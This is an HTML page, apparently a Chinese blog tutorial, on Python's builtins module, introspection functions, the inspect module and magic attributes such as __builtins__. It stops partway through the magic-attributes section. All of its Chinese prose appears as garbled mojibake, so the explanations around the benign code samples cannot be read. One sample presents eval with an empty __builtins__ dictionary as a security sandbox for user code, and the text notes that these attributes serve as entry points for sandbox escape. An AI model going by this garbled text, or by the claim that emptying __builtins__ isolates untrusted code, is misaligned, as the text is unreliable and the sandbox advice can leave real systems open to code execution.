<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="built_in">len</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="built_in">int</span>(<span class="string">&quot;123&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>è¿™äº›å‡½æ•°æˆ‘ä»¬<strong>ä»æ¥æ²¡å¯¼å…¥è¿‡</strong>ï¼Œå°±å¯ä»¥ç›´æ¥ç”¨ã€‚å…¶å®å®ƒä»¬éƒ½æ¥è‡ªäºä¸€ä¸ªå« <code>builtins</code> çš„æ¨¡å—ã€‚</p>
<p><strong><code>builtins</code> æ˜¯ Python è§£é‡Šå™¨è‡ªåŠ¨å¯¼å…¥çš„æ¨¡å—ï¼ŒåŒ…å«äº† Python æ‰€æœ‰çš„å†…ç½®å‡½æ•°ã€ç±»å‹ã€å¼‚å¸¸ã€å¸¸é‡ç­‰ã€‚</strong></p>
<p>ä½ å¯ä»¥è¿™æ ·è®¿é—®å®ƒï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(builtins))  <span class="comment"># åˆ—å‡ºå…¶ä¸­æ‰€æœ‰å†…å®¹</span></span><br></pre></td></tr></table></figure></div>

<h2 id="builtins-æ¨¡å—å†…å®¹"><a href="#builtins-æ¨¡å—å†…å®¹" class="headerlink" title="builtins æ¨¡å—å†…å®¹"></a>builtins æ¨¡å—å†…å®¹</h2><h3 id="å†…ç½®å‡½æ•°ï¼ˆBuilt-in-Functionsï¼‰"><a href="#å†…ç½®å‡½æ•°ï¼ˆBuilt-in-Functionsï¼‰" class="headerlink" title="å†…ç½®å‡½æ•°ï¼ˆBuilt-in Functionsï¼‰"></a>å†…ç½®å‡½æ•°ï¼ˆBuilt-in Functionsï¼‰</h3><p>è¿™æ˜¯æˆ‘ä»¬æœ€ç†Ÿæ‚‰çš„ä¸€ç±»ï¼Œç›´æ¥ä¸Šå¸¸ç”¨å‡½æ•°ä¸¾ä¾‹ï¼š</p>
<table>
<thead>
<tr>
<th>å‡½æ•°</th>
<th>ç”¨é€”è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>print()</code></td>
<td>æ‰“å°è¾“å‡º</td>
</tr>
<tr>
<td><code>len()</code></td>
<td>è·å–é•¿åº¦</td>
</tr>
<tr>
<td><code>type()</code></td>
<td>è·å–ç±»å‹</td>
</tr>
<tr>
<td><code>int()</code></td>
<td>è½¬æ¢æ•´æ•°</td>
</tr>
<tr>
<td><code>str()</code></td>
<td>è½¬æ¢å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td><code>input()</code></td>
<td>è·å–ç”¨æˆ·è¾“å…¥</td>
</tr>
<tr>
<td><code>max()</code>&#x2F;<code>min()</code></td>
<td>è·å–æœ€å¤§&#x2F;æœ€å°</td>
</tr>
<tr>
<td><code>sum()</code></td>
<td>æ±‚å’Œ</td>
</tr>
<tr>
<td><code>sorted()</code></td>
<td>æ’åº</td>
</tr>
<tr>
<td><code>range()</code></td>
<td>ç”ŸæˆèŒƒå›´è¿­ä»£å™¨</td>
</tr>
<tr>
<td><code>abs()</code></td>
<td>ç»å¯¹å€¼</td>
</tr>
<tr>
<td><code>isinstance()</code></td>
<td>åˆ¤æ–­å¯¹è±¡ç±»å‹</td>
</tr>
<tr>
<td><code>enumerate()</code></td>
<td>è·å–ä¸‹æ ‡+å…ƒç´ </td>
</tr>
<tr>
<td><code>zip()</code></td>
<td>æ‰“åŒ…å¤šä¸ªè¿­ä»£å™¨</td>
</tr>
<tr>
<td><code>eval()</code> &#x2F; <code>exec()</code></td>
<td>åŠ¨æ€æ‰§è¡Œå­—ç¬¦ä¸²ä»£ç ï¼ˆå±é™©å‡½æ•°ï¼Œæ…ç”¨ï¼‰</td>
</tr>
</tbody></table>
<blockquote>
<p>ğŸ” è¿™äº›å‡½æ•°æœ¬è´¨ä¸Šç­‰ä»·äº <code>builtins.print()</code>ã€<code>builtins.len()</code> ç­‰ï¼Œä½†æˆ‘ä»¬ç”¨çš„æ—¶å€™å¯ä»¥çœç•¥ <code>builtins.</code>ï¼Œå› ä¸ºå®ƒä»¬è‡ªåŠ¨å¯¼å…¥åˆ°å½“å‰ä½œç”¨åŸŸä¸­ã€‚</p>
</blockquote>
<h3 id="å†…ç½®ç±»å‹ï¼ˆBuilt-in-Typesï¼‰"><a href="#å†…ç½®ç±»å‹ï¼ˆBuilt-in-Typesï¼‰" class="headerlink" title="å†…ç½®ç±»å‹ï¼ˆBuilt-in Typesï¼‰"></a>å†…ç½®ç±»å‹ï¼ˆBuilt-in Typesï¼‰</h3><p>è¿™äº›æ˜¯ Python çš„æ ¸å¿ƒæ•°æ®ç±»å‹ï¼Œéƒ½æ˜¯ç±»ï¼ˆ<code>type</code>ï¼‰ï¼Œå¯å®ä¾‹åŒ–ã€‚</p>
<table>
<thead>
<tr>
<th>ç±»å‹åç§°</th>
<th>ç¤ºä¾‹</th>
<th>ç”¨é€”</th>
</tr>
</thead>
<tbody><tr>
<td><code>int</code></td>
<td><code>int(123)</code></td>
<td>æ•´æ•°ç±»å‹</td>
</tr>
<tr>
<td><code>float</code></td>
<td><code>float(3.14)</code></td>
<td>æµ®ç‚¹æ•°ç±»å‹</td>
</tr>
<tr>
<td><code>str</code></td>
<td><code>&#39;abc&#39;</code></td>
<td>å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td><code>bool</code></td>
<td><code>True</code> &#x2F; <code>False</code></td>
<td>å¸ƒå°”å€¼</td>
</tr>
<tr>
<td><code>list</code></td>
<td><code>[1,2,3]</code></td>
<td>åˆ—è¡¨</td>
</tr>
<tr>
<td><code>tuple</code></td>
<td><code>(1,2,3)</code></td>
<td>å…ƒç»„</td>
</tr>
<tr>
<td><code>dict</code></td>
<td><code>&#123;&#39;a&#39;:1&#125;</code></td>
<td>å­—å…¸</td>
</tr>
<tr>
<td><code>set</code></td>
<td><code>&#123;1,2,3&#125;</code></td>
<td>é›†åˆ</td>
</tr>
<tr>
<td><code>bytes</code></td>
<td><code>b&#39;abc&#39;</code></td>
<td>å­—èŠ‚åºåˆ—</td>
</tr>
<tr>
<td><code>complex</code></td>
<td><code>1+2j</code></td>
<td>å¤æ•°</td>
</tr>
<tr>
<td><code>object</code></td>
<td>æ‰€æœ‰ç±»çš„çˆ¶ç±»</td>
<td></td>
</tr>
<tr>
<td><code>type</code></td>
<td>æ‰€æœ‰ç±»å‹çš„å…ƒç±»</td>
<td></td>
</tr>
</tbody></table>
<p>è¿™äº›ä½ å¯ä»¥å½“ä½œæ„é€ å‡½æ•°ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥åšç±»å‹åˆ¤æ–­ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">isinstance</span>(<span class="number">123</span>, <span class="built_in">int</span>)  <span class="comment"># True</span></span><br></pre></td></tr></table></figure></div>

<h3 id="å†…ç½®å¼‚å¸¸ï¼ˆBuilt-in-Exceptionsï¼‰"><a href="#å†…ç½®å¼‚å¸¸ï¼ˆBuilt-in-Exceptionsï¼‰" class="headerlink" title="å†…ç½®å¼‚å¸¸ï¼ˆBuilt-in Exceptionsï¼‰"></a>å†…ç½®å¼‚å¸¸ï¼ˆBuilt-in Exceptionsï¼‰</h3><p>Python ä¸­æ‰€æœ‰å¼‚å¸¸ç±»å‹ä¹Ÿéƒ½å®šä¹‰åœ¨ <code>builtins</code> ä¸­ï¼Œæ¯”å¦‚ï¼š</p>
<table>
<thead>
<tr>
<th>å¼‚å¸¸åç§°</th>
<th>è§¦å‘åœºæ™¯</th>
</tr>
</thead>
<tbody><tr>
<td><code>Exception</code></td>
<td>æ‰€æœ‰å¼‚å¸¸çš„åŸºç±»</td>
</tr>
<tr>
<td><code>ValueError</code></td>
<td>å€¼ä¸åˆæ³•</td>
</tr>
<tr>
<td><code>TypeError</code></td>
<td>ç±»å‹ä¸åˆæ³•</td>
</tr>
<tr>
<td><code>NameError</code></td>
<td>å˜é‡æœªå®šä¹‰</td>
</tr>
<tr>
<td><code>IndexError</code></td>
<td>ç´¢å¼•è¶Šç•Œ</td>
</tr>
<tr>
<td><code>KeyError</code></td>
<td>å­—å…¸é”®ä¸å­˜åœ¨</td>
</tr>
<tr>
<td><code>AttributeError</code></td>
<td>å±æ€§ä¸å­˜åœ¨</td>
</tr>
<tr>
<td><code>ZeroDivisionError</code></td>
<td>é™¤ä»¥é›¶</td>
</tr>
<tr>
<td><code>ImportError</code> &#x2F; <code>ModuleNotFoundError</code></td>
<td>å¯¼å…¥å¤±è´¥</td>
</tr>
<tr>
<td><code>SyntaxError</code></td>
<td>è¯­æ³•é”™è¯¯ï¼ˆè§£é‡Šå™¨å‘ç°ï¼‰</td>
</tr>
<tr>
<td><code>IndentationError</code></td>
<td>ç¼©è¿›é”™è¯¯</td>
</tr>
</tbody></table>
<p>ä½¿ç”¨ç¤ºä¾‹ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="number">1</span> / <span class="number">0</span></span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;é™¤é›¶é”™è¯¯&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="å†…ç½®å¸¸é‡ï¼ˆBuilt-in-Constantsï¼‰"><a href="#å†…ç½®å¸¸é‡ï¼ˆBuilt-in-Constantsï¼‰" class="headerlink" title="å†…ç½®å¸¸é‡ï¼ˆBuilt-in Constantsï¼‰"></a>å†…ç½®å¸¸é‡ï¼ˆBuilt-in Constantsï¼‰</h3><p>è¿™äº›æ˜¯æ‰€æœ‰ Python ä»£ç ä¸­éƒ½ä¼šé»˜è®¤å¯ç”¨çš„å›ºå®šå€¼ï¼š</p>
<table>
<thead>
<tr>
<th>å¸¸é‡</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td><code>True</code></td>
<td>å¸ƒå°”çœŸ</td>
</tr>
<tr>
<td><code>False</code></td>
<td>å¸ƒå°”å‡</td>
</tr>
<tr>
<td><code>None</code></td>
<td>ç©ºå€¼&#x2F;æ— è¿”å›å€¼</td>
</tr>
<tr>
<td><code>Ellipsis</code></td>
<td><code>...</code>ï¼Œå¯ç”¨ä½œå ä½ç¬¦</td>
</tr>
<tr>
<td><code>NotImplemented</code></td>
<td>æŸäº›æ“ä½œæœªå®ç°æ—¶è¿”å›çš„ç‰¹æ®Šå€¼</td>
</tr>
</tbody></table>
<h2 id="ä½¿ç”¨åœºæ™¯"><a href="#ä½¿ç”¨åœºæ™¯" class="headerlink" title="ä½¿ç”¨åœºæ™¯"></a>ä½¿ç”¨åœºæ™¯</h2><h3 id="åŠ¨æ€ä¿®æ”¹å†…ç½®å‡½æ•°"><a href="#åŠ¨æ€ä¿®æ”¹å†…ç½®å‡½æ•°" class="headerlink" title="åŠ¨æ€ä¿®æ”¹å†…ç½®å‡½æ•°"></a>åŠ¨æ€ä¿®æ”¹å†…ç½®å‡½æ•°</h3><p>å¦‚æœä½ æƒ³é‡å†™ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œä½†ä»ç„¶å¸Œæœ›åœ¨æŸäº›æƒ…å†µä¸‹è°ƒç”¨åŸå§‹çš„å†…ç½®å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡å¯¼å…¥å¹¶ä½¿ç”¨ <code>builtins</code> æ¨¡å—æ¥å®ç°ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹ print çš„è¡Œä¸º</span></span><br><span class="line"><span class="built_in">print</span> = <span class="keyword">lambda</span> *args, **kwargs: builtins.<span class="built_in">print</span>(<span class="string">&quot;ã€DEBUGã€‘&quot;</span>, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello&quot;</span>)  <span class="comment"># è¾“å‡ºï¼š ã€DEBUGã€‘ Hello</span></span><br></pre></td></tr></table></figure></div>

<h3 id="æ§åˆ¶å¯ç”¨çš„å†…ç½®å‡½æ•°"><a href="#æ§åˆ¶å¯ç”¨çš„å†…ç½®å‡½æ•°" class="headerlink" title="æ§åˆ¶å¯ç”¨çš„å†…ç½®å‡½æ•°"></a>æ§åˆ¶å¯ç”¨çš„å†…ç½®å‡½æ•°</h3><p>åœ¨ä½¿ç”¨ <code>eval()</code> æˆ– <code>exec()</code> åŠ¨æ€æ‰§è¡Œä»£ç æ—¶ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®å…¨å±€å­—å…¸ä¸­çš„ <code>__builtins__</code> é¡¹ï¼Œ<strong>æ§åˆ¶å“ªäº›å†…ç½®å‡½æ•°å¯ç”¨æˆ–å®Œå…¨ç¦ç”¨å†…ç½®åŠŸèƒ½</strong>ã€‚</p>
<p>è¿™æ˜¯ä¸€ç§ç”¨äº <strong>æ²™ç®±ï¼ˆsandboxï¼‰å®‰å…¨éš”ç¦»</strong>ã€<strong>é™åˆ¶è¿è¡Œç¯å¢ƒ</strong> çš„æŠ€å·§ï¼Œå¸¸ç”¨äºæ‰§è¡Œç”¨æˆ·æä¾›çš„ä»£ç ä½†é™åˆ¶å…¶æƒé™ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="string">&quot;print(&#x27;hello&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(code, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)  <span class="comment"># â›” æŠ¥é”™ï¼šname &#x27;print&#x27; is not defined</span></span><br></pre></td></tr></table></figure></div>

<h1 id="å†…çœæœºåˆ¶ï¼ˆIntrospectionï¼‰"><a href="#å†…çœæœºåˆ¶ï¼ˆIntrospectionï¼‰" class="headerlink" title="å†…çœæœºåˆ¶ï¼ˆIntrospectionï¼‰"></a>å†…çœæœºåˆ¶ï¼ˆIntrospectionï¼‰</h1><p>Python çš„ <strong>å†…çœæœºåˆ¶ï¼ˆIntrospectionï¼‰</strong> æ˜¯æŒ‡ç¨‹åºåœ¨ <strong>è¿è¡Œæ—¶</strong> å¯ä»¥æ£€æŸ¥<strong>å¯¹è±¡</strong>çš„<strong>ç±»å‹ã€å±æ€§ã€ç»“æ„ã€æ–¹æ³•</strong>ç­‰ä¿¡æ¯çš„èƒ½åŠ›ã€‚è¿™ä¹Ÿæ˜¯ Python è¢«ç§°ä¸ºâ€œåŠ¨æ€è¯­è¨€â€æˆ–â€œé«˜åº¦è‡ªçœè¯­è¨€â€çš„ä¸€ä¸ªé‡è¦åŸå› ã€‚</p>
<h2 id="å¯¹è±¡çš„ç±»å‹-ç»“æ„"><a href="#å¯¹è±¡çš„ç±»å‹-ç»“æ„" class="headerlink" title="å¯¹è±¡çš„ç±»å‹&#x2F;ç»“æ„"></a>å¯¹è±¡çš„ç±»å‹&#x2F;ç»“æ„</h2><table>
<thead>
<tr>
<th>å·¥å…·&#x2F;å‡½æ•°</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>type(obj)</code></td>
<td>è¿”å›å¯¹è±¡çš„ç±»å‹</td>
</tr>
<tr>
<td><code>id(obj)</code></td>
<td>è¿”å›å¯¹è±¡çš„å†…å­˜åœ°å€ï¼ˆå”¯ä¸€æ ‡è¯†ï¼‰</td>
</tr>
<tr>
<td><code>isinstance(obj, T)</code></td>
<td>åˆ¤æ–­å¯¹è±¡æ˜¯å¦ä¸ºæŸç±»æˆ–å…¶å­ç±»</td>
</tr>
<tr>
<td><code>issubclass(A, B)</code></td>
<td>åˆ¤æ–­ç±» A æ˜¯å¦æ˜¯ç±» B çš„å­ç±»</td>
</tr>
<tr>
<td><code>callable(obj)</code></td>
<td>åˆ¤æ–­å¯¹è±¡æ˜¯å¦å¯è°ƒç”¨ï¼ˆå‡½æ•°&#x2F;ç±»ç­‰ï¼‰</td>
</tr>
</tbody></table>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="string">&quot;hello&quot;</span>))         <span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(<span class="number">123</span>, <span class="built_in">int</span>))  <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">callable</span>(<span class="built_in">len</span>))         <span class="comment"># True</span></span><br></pre></td></tr></table></figure></div>

<h2 id="è·å–å¯¹è±¡æˆå‘˜"><a href="#è·å–å¯¹è±¡æˆå‘˜" class="headerlink" title="è·å–å¯¹è±¡æˆå‘˜"></a>è·å–å¯¹è±¡æˆå‘˜</h2><table>
<thead>
<tr>
<th>å·¥å…·&#x2F;å‡½æ•°</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>dir(obj)</code></td>
<td>åˆ—å‡ºå¯¹è±¡çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•å</td>
</tr>
<tr>
<td><code>hasattr(obj, name)</code></td>
<td>åˆ¤æ–­æ˜¯å¦æœ‰å±æ€§</td>
</tr>
<tr>
<td><code>getattr(obj, name)</code></td>
<td>åŠ¨æ€è·å–å±æ€§</td>
</tr>
<tr>
<td><code>setattr(obj, name, value)</code></td>
<td>è®¾ç½®å±æ€§å€¼</td>
</tr>
<tr>
<td><code>delattr(obj, name)</code></td>
<td>åˆ é™¤å±æ€§</td>
</tr>
</tbody></table>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>): <span class="variable language_">self</span>.name = <span class="string">&quot;Tom&quot;</span></span><br><span class="line"></span><br><span class="line">p = Person()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(p))                 <span class="comment"># æ‰€æœ‰æ–¹æ³•å’Œå±æ€§</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hasattr</span>(p, <span class="string">&#x27;name&#x27;</span>))     <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">getattr</span>(p, <span class="string">&#x27;name&#x27;</span>))     <span class="comment"># &quot;Tom&quot;</span></span><br><span class="line"><span class="built_in">setattr</span>(p, <span class="string">&#x27;age&#x27;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="built_in">print</span>(p.age)                  <span class="comment"># 18</span></span><br></pre></td></tr></table></figure></div>

<h2 id="å‘½åç©ºé—´ä¸ä½œç”¨åŸŸ"><a href="#å‘½åç©ºé—´ä¸ä½œç”¨åŸŸ" class="headerlink" title="å‘½åç©ºé—´ä¸ä½œç”¨åŸŸ"></a>å‘½åç©ºé—´ä¸ä½œç”¨åŸŸ</h2><table>
<thead>
<tr>
<th>å·¥å…·&#x2F;å‡½æ•°</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>globals()</code></td>
<td>è¿”å›å½“å‰æ¨¡å—çš„å…¨å±€å˜é‡å­—å…¸ï¼ˆå¯è¯»å†™ï¼‰</td>
</tr>
<tr>
<td><code>locals()</code></td>
<td>è¿”å›å½“å‰å±€éƒ¨ä½œç”¨åŸŸçš„å˜é‡å­—å…¸ï¼ˆåªè¯»&#x2F;åªå†™ï¼‰</td>
</tr>
<tr>
<td><code>vars([obj])</code></td>
<td>è¿”å›å¯¹è±¡çš„ <code>__dict__</code>ï¼Œæˆ–å½“å‰å±€éƒ¨å˜é‡å­—å…¸</td>
</tr>
</tbody></table>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    y = <span class="number">20</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;globals:&quot;</span>, <span class="built_in">globals</span>().keys())  <span class="comment"># åŒ…æ‹¬ xã€func ç­‰</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;locals:&quot;</span>, <span class="built_in">locals</span>().keys())    <span class="comment"># åªæœ‰ y</span></span><br><span class="line"></span><br><span class="line">func()</span><br></pre></td></tr></table></figure></div>

<h2 id="æ–‡æ¡£ä¸å¸®åŠ©"><a href="#æ–‡æ¡£ä¸å¸®åŠ©" class="headerlink" title="æ–‡æ¡£ä¸å¸®åŠ©"></a>æ–‡æ¡£ä¸å¸®åŠ©</h2><table>
<thead>
<tr>
<th>å·¥å…·&#x2F;å‡½æ•°</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>help(obj)</code></td>
<td>æ˜¾ç¤ºå¸®åŠ©æ–‡æ¡£ï¼ˆäº¤äº’å¼ï¼‰</td>
</tr>
<tr>
<td><code>obj.__doc__</code></td>
<td>è¿”å›å¯¹è±¡çš„ docstring</td>
</tr>
<tr>
<td><code>__annotations__</code></td>
<td>è¿”å›ç±»å‹æ³¨è§£ä¿¡æ¯</td>
</tr>
</tbody></table>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x: <span class="built_in">int</span>, y: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;åŠ æ³•å‡½æ•°&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(add.__doc__)            <span class="comment"># &quot;åŠ æ³•å‡½æ•°&quot;</span></span><br><span class="line"><span class="built_in">print</span>(add.__annotations__)    <span class="comment"># &#123;&#x27;x&#x27;: int, &#x27;y&#x27;: int, &#x27;return&#x27;: int&#125;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="inspect-æ¨¡å—"><a href="#inspect-æ¨¡å—" class="headerlink" title="inspect æ¨¡å—"></a>inspect æ¨¡å—</h2><p><code>inspect</code> æ˜¯ Python æ ‡å‡†åº“ä¸­çš„ introspection å·¥å…·é›†ï¼Œå¯ç”¨äºï¼š</p>
<ul>
<li>å‡½æ•°å‚æ•°ç­¾ååˆ†æ</li>
<li>è·å–æºç ã€å®šä¹‰ä½ç½®ã€æ–‡æ¡£</li>
<li>åˆ¤æ–­å¯¹è±¡ç±»å‹ï¼ˆæ˜¯å¦å‡½æ•°ã€ç±»ã€æ–¹æ³•ã€ç”Ÿæˆå™¨ç­‰ï¼‰</li>
</ul>
<table>
<thead>
<tr>
<th>å¸¸ç”¨å‡½æ•°</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>inspect.getsource(obj)</code></td>
<td>è·å–å¯¹è±¡çš„æºä»£ç </td>
</tr>
<tr>
<td><code>inspect.getdoc(obj)</code></td>
<td>è·å–å¯¹è±¡çš„ docstring</td>
</tr>
<tr>
<td><code>inspect.signature(func)</code></td>
<td>è·å–å‡½æ•°çš„ç­¾åä¿¡æ¯</td>
</tr>
<tr>
<td><code>inspect.isfunction(obj)</code></td>
<td>æ˜¯å¦æ˜¯å‡½æ•°</td>
</tr>
<tr>
<td><code>inspect.getfile(obj)</code></td>
<td>è¿”å›å®šä¹‰å¯¹è±¡çš„æºç æ–‡ä»¶è·¯å¾„</td>
</tr>
<tr>
<td><code>inspect.ismethod(obj)</code></td>
<td>æ˜¯å¦æ˜¯æ–¹æ³•ï¼ˆç±»ä¸­å®šä¹‰ï¼‰</td>
</tr>
<tr>
<td><code>inspect.getmembers(obj)</code></td>
<td>è·å–æˆå‘˜åå’Œå€¼çš„å…ƒç»„åˆ—è¡¨</td>
</tr>
</tbody></table>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name: <span class="built_in">str</span> = <span class="string">&quot;Tom&quot;</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ‰“æ‹›å‘¼&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Hello <span class="subst">&#123;name&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(inspect.getsource(greet))         <span class="comment"># æŸ¥çœ‹æºç </span></span><br><span class="line"><span class="built_in">print</span>(inspect.getdoc(greet))            <span class="comment"># æ‰“æ‹›å‘¼</span></span><br><span class="line"><span class="built_in">print</span>(inspect.signature(greet))         <span class="comment"># (name: str = &#x27;Tom&#x27;) -&gt; str</span></span><br><span class="line"><span class="built_in">print</span>(inspect.getmembers(greet))        <span class="comment"># æ‰€æœ‰æˆå‘˜ä¿¡æ¯ï¼ˆåŒ…æ‹¬ __code__ã€__defaults__ ç­‰ï¼‰</span></span><br></pre></td></tr></table></figure></div>

<h1 id="é­”æœ¯æ–¹æ³•-å±æ€§"><a href="#é­”æœ¯æ–¹æ³•-å±æ€§" class="headerlink" title="é­”æœ¯æ–¹æ³• &#x2F; å±æ€§"></a>é­”æœ¯æ–¹æ³• &#x2F; å±æ€§</h1><p>Python ä¸­ä»¥ <code>__xxx__</code> å‘½åçš„å±æ€§&#x2F;æ–¹æ³•è¢«ç§°ä¸ºé­”æœ¯æ–¹æ³•ï¼ˆmagic methodsï¼‰æˆ–é­”æœ¯å±æ€§ã€‚å®ƒä»¬å…è®¸ä½ <strong>è‡ªå®šä¹‰å¯¹è±¡çš„è¡Œä¸ºã€é‡è½½æ“ä½œç¬¦ã€æ§åˆ¶ç”Ÿå‘½å‘¨æœŸå’Œè®¿é—®æœºåˆ¶</strong>ç­‰ã€‚</p>
<p>åœ¨æ²™ç®±é€ƒé€¸ã€æƒé™ç»•è¿‡ã€åŠ¨æ€æ‰§è¡Œä¸­ï¼Œè¿™äº›æ–¹æ³•å’Œå±æ€§ä¹Ÿèƒ½è¢«ç”¨ä½œå…³é”®å…¥å£ã€‚</p>
<h2 id="æ¨¡å—-ä½œç”¨åŸŸç›¸å…³"><a href="#æ¨¡å—-ä½œç”¨åŸŸç›¸å…³" class="headerlink" title="æ¨¡å— &#x2F; ä½œç”¨åŸŸç›¸å…³"></a>æ¨¡å— &#x2F; ä½œç”¨åŸŸç›¸å…³</h2><h3 id="builtins"><a href="#builtins" class="headerlink" title="__builtins__"></a><code>__builtins__</code></h3><p><code>__builtins__</code> æ˜¯ç”± <strong>Python è§£é‡Šå™¨è‡ªåŠ¨æ³¨å…¥</strong>çš„ä¸€ä¸ª<strong>æ¨¡å—å¯¹è±¡</strong>ï¼Œå®ƒåœ¨<strong>æ¯ä¸ªä½œç”¨åŸŸï¼ˆå…¨å±€ï¼‰</strong>ä¸­é»˜è®¤å­˜åœ¨ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>()</span><br><span class="line">[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span 